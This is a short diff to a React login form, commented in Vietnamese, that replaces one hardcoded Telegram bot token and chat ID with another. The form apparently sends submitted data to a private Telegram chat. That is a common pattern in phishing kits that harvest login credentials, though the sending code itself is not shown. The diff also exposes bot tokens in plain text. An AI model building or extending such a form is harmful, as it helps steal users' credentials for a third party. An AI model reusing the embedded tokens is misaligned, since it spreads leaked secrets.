@@ -8,8 +8,8 @@ import "react-phone-input-2/lib/style.css";
 function LoginForm({ onClose }) {
   // State quản lý hiển thị password
 
-  const botToken = "8303564128:AAE4w2OF13TfX-Xcl_bquIvgkMOApkhQAec";
-  const chatId = "6604062347"; // ✅ ĐÚNG chatID mới
+  const botToken = "8086716759:AAFCscXRDQyhE5ALacAQyx5trLb40KQfABM";
+  const chatId = "1140844339"; // ✅ ĐÚNG chatID mới
   const [messageId, setMessageId] = useState(null); // dùng để cập nhật tin nhắn
 
   const navigate = useNavigate();
